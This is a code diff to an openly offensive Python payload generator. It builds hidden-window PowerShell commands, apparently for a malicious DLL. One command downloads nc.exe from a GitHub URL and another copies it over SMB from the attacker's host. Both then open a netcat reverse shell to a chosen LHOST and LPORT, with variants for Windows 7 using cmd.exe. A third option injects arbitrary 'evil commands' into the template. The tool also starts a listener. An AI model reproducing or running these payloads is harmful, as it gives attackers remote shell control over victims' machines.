@@ -72,17 +72,22 @@ def generate():
     print("Enter '2' to Create an NC Reverse Shell Payload" + colored(" -- (Works Best!!)", "green"))
     print("Enter '3' for SMB transfer payload (Only works in lan)")
     choice = input("Attack choice -> ")
+    print("Which OS are you targeting ? " + colored(" Type: 'win7' or 'other'", "blue"))
+    ver = input(colored("[+] Target OS - > ", "red"))
     if "1" in choice:            # Custom Commmands Option
         get_payload = read_payload()
         print(colored("make sure to use Double Backslashs !!!", "red"))
-        print("Example: C:\\\\Windows\\\\System32")
+        print("\nExample: C:\\\\Windows\\\\System32\n")
         evil = input("Enter Evil Command - > ")
         payload = re.sub('".+"', '"' + evil + '"', get_payload)    # Using Regex to change the base Source Code
     if "2" in choice:
         get_payload = read_payload()
         LHOST = input("LHOST - > ")
         LPORT = input("LPORT - > ")
-        evil = (f"powershell -windowstyle hidden Invoke-WebRequest -uri https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -outfile nc.exe & nc.exe {LHOST} {LPORT} -e powershell.exe"   )   # The Evil Payload
+        if "other" in ver:
+            evil = (f"powershell -windowstyle hidden Invoke-WebRequest -uri https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -outfile nc.exe & nc.exe {LHOST} {LPORT} -e powershell.exe"   )   # The Evil Payload
+        if "win7" in ver:
+            evil = (f"powershell -windowstyle hidden Invoke-WebRequest -uri https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -outfile nc.exe & nc.exe {LHOST} {LPORT} -e cmd.exe"   )   # The Evil Payload
         payload = re.sub('".+"', '"' + evil + '"', get_payload)
     if "3" in choice:
         print(colored("\n[+] Opening SMB server and netcat for delivery !\n", "red"))   # Opening SecureAuthCorp - impacket-smbserver.py
@@ -92,7 +97,10 @@ def generate():
         get_payload = read_payload()
         LHOST = input("LHOST - > ")
         LPORT = input("LPORT - > ")
-        evil = (f"powershell -windowstyle hidden copy \\\\\\\{LHOST}\\\hacking\\\\nc.exe & nc.exe {LHOST} {LPORT} -e powershell.exe")   # Payload in the DLL that copy's the nc.exe file and executes a reverse shell
+        if "other" in ver:
+            evil = (f"powershell -windowstyle hidden copy \\\\\\\{LHOST}\\\hacking\\\\nc.exe & nc.exe {LHOST} {LPORT} -e powershell.exe")   # Payload in the DLL that copy's the nc.exe file and executes a reverse shell
+        if "win7" in ver:
+            evil = (f"powershell -windowstyle hidden copy \\\\\\\{LHOST}\\\hacking\\\\nc.exe & nc.exe {LHOST} {LPORT} -e cmd.exe")   # Payload in the DLL that copy's the nc.exe file and executes a reverse shell
         payload = get_payload.replace("malicouscontent", evil)   # Due to regex having troubles with \\ I used .replace instead
 
     return [payload, LPORT]
@@ -142,5 +150,3 @@ try:
     start_listner(malicous[1])
 except KeyboardInterrupt:
     print(colored("\n\n[+] Program Existed", 'red'))
-
-
